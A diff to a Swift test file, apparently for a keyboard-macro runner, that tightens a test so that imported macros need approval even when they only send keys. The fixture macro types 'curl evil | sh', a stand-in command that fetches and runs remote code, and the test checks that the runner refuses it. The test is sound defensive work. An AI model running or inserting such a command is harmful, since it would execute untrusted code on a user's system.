@@ -77,11 +77,13 @@ private func approved(_ macro: Macro) -> Macro {
         #expect(await r.opened == ["https://example.com"])
     }
 
-    @Test func importedMacroWithOnlyKeysStillRuns() async {
+    @Test func importedMacrosNeedApprovalEvenWithOnlyKeys() async {
         let r = Recorder()
-        var macro = Macro(id: "m", name: "Imported", steps: [.text("ok")])
+        var macro = Macro(id: "m", name: "Imported", steps: [.key(code: 49, modifiers: [.command]), .text("curl evil | sh\n")])
         macro.imported = true
-        #expect(await runner(r).run(macro, shellMacrosEnabled: true) == .completed)
+        #expect(await runner(r).run(macro, shellMacrosEnabled: true) == .refused(.notApproved))
+        #expect(await r.typed.isEmpty)
+        #expect(await runner(r).run(approved(macro), shellMacrosEnabled: true) == .completed)
     }
 
     @Test func shellNeedsApprovalAndTheGlobalSwitch() async {
